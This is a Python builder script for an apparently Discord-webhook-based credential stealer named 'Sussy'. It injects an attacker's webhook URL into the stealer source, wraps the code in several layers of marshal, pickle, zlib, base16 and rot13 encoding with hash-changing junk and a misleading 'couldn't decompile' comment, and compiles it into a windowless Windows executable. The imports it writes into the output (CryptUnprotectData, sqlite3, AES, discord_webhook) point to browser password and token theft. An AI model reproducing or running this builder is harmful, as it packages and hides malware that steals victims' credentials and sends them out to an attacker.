import base64, zlib, pickle, marshal, codecs, random, string, os, shutil

class SimpleBuildSussy:

    def __init__(self):
        FILE = open("Sussy.py","r+").read()
        webhook = input("Enter Webhook --> ")
        name = input("Enter file name --> ")
        try:
            name = name.replace(" ","_")
        except:
            pass
        obf = input("Obfuscate (y/n) --> ")
        compil3 = input("Compile to EXE (y/n) --> ")
        FILE = FILE.replace('wbh = ""',f'wbh = "{webhook}"')
        open(f"Compiled/{name}.py","w+").write(FILE)
        if obf == "y":
            self.__obf__(name)
        if compil3 == "y":
            self.__compile__(name)
        input("\nFinished..")
    
    def __compile__(self,name):
        os.system(f"pyinstaller --onefile --name {name} --noconsole --clean Compiled/{name}.py")
        try:
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\Compiled\\{name}.exe")
        except:pass
        try:
            shutil.rmtree('build')
        except:pass
        try:
            shutil.rmtree('dist')
        except:pass
        try:
            shutil.rmtree('__pycache__')
        except:pass
        try:
            os.remove(f'{name}.spec')
        except:pass
        try:
            os.remove(f'{name}.py')
        except:pass

    def __obf__(self,name):
        CONTENT = open(f"Compiled/{name}.py",'r+').read()
        A="S1MP13___4SS_STR1N6______WTF___1S____TH15_BR0_______WTFFF___"
        B = r"\xff\xfeW\x00T\x00F\x00_\x00T\x00H\x001\x00S\x00_\x00_\x00C\x000\x00D\x003\x00_\x00_\x00_\x00_\x001\x00S\x00_\x00_\x00_\x00S\x000\x00_\x00_\x00_\x00_\x00F\x00U\x00C\x00K\x00I\x00N\x00G\x00_\x00_\x00_\x00W\x003\x001\x00R\x00D\x00_\x00_\x00_\x00_\x00_\x00_\x00B\x00R\x000\x00_\x00_\x00_\x00_\x00_\x00" * 5
        C = f"{A}=b'{B}'\n"*1
        D = "MyMomGaveMePeanutsForMyBirthday_"*50
        HASHchanger=""
        for _ in range(20):
            HASHchanger += ''.join(random.choices(string.ascii_uppercase + string.digits, k=35))+"\n"
        HASHchanger2=""
        for _ in range(20):
            HASHchanger2 += ''.join(random.choices(string.ascii_uppercase + string.digits, k=35))+"\n"
        def S1MPL3(code:str,wall:bool):
            if wall:POOP = codecs.encode(base64.b16encode(zlib.compress(pickle.dumps(marshal.dumps(compile(code.encode(),f"SIMPLE ASF","exec"))))).decode(),"rot13")
            else:POOP=base64.b16encode(zlib.compress(pickle.dumps(marshal.dumps(compile(code.encode(),f"SIMPLE ASF","exec"))))).decode()
            POOP = POOP.replace("0","_IlIIlIIllIIIll").replace("1","_IlIllIIllIIIll").replace("2","_IlIIlIIllIIIlI").replace("3","_IllllIIllIIIll").replace("4","_IlIIlIIlIIlIll").replace("5","_IlIIlIIllIIIII").replace("A","_IlIIlllllIIIll").replace("B","_llIIlIIllIIlIl").replace("C","_llIllIIlllIIlI")
            CONTENT = f"""# Couldnt decompile all the code.\n'''\n{HASHchanger}'''\nimport requests, os, base64, shutil\nfrom json import loads\nfrom win32crypt import CryptUnprotectData\nfrom sqlite3 import connect\nfrom Crypto.Cipher import AES\nfrom discord_webhook import DiscordWebhook, DiscordEmbed\n'''\n{HASHchanger2}'''\n__Obf__="S1mpl3 0bf v2"
"""+f"""S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___ = '{POOP}'"""+"""
"""+f"""{C}\n#{D}"""+r"""
"""+f"""{C}\n#{D}"""+r"""
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}',f'{chr(48)}')
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(108)}{chr(108)}',f'{chr(52)}')
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(108)}',f'{chr(66)}')
"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(73)}{chr(108)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}',f'{chr(49)}')
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}',f'{chr(50)}')
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(73)}{chr(108)}{chr(108)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}',f'{chr(51)}')
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(73)}{chr(73)}{chr(73)}',f'{chr(53)}')
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(108)}{chr(108)}{chr(73)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(73)}',f'{chr(67)}')
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___.replace(f'{chr(95)}{chr(73)}{chr(108)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}{chr(108)}{chr(108)}{chr(108)}{chr(73)}{chr(73)}{chr(73)}{chr(108)}{chr(108)}',f'{chr(65)}')
"""+f"""{C}"""
            if wall:
                    CONTENT+=r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}").decode(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___,f"{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}")
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}").b16decode(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}\n#{D}"""
            else:
                CONTENT+=r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}").b16decode(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}\n#{D}"""
            CONTENT+=r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(122)}{chr(108)}{chr(105)}{chr(98)}").decompress(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}\n#{D}"""+r"""
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(112)}{chr(105)}{chr(99)}{chr(107)}{chr(108)}{chr(101)}").loads(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}\n#{D}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(98)}{chr(117)}{chr(105)}{chr(108)}{chr(116)}{chr(105)}{chr(110)}{chr(115)}").exec(__import__(f"{chr(109)}{chr(97)}{chr(114)}{chr(115)}{chr(104)}{chr(97)}{chr(108)}").loads(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___))
"""+f"""{C}\n#{D}"""+r"""
"""+f"""{C}\n#{D}"""+r"""
"""+f"""{C}\n#{D}"""+r"""
"""
            return CONTENT
        obf_content = S1MPL3(CONTENT,True)
        obf_content = S1MPL3(obf_content,False)
        obf_content = S1MPL3(obf_content,True)
        obf_content = S1MPL3(obf_content,False)
        open(f"Compiled/{name}.py","w+").write(obf_content)

SimpleBuildSussy()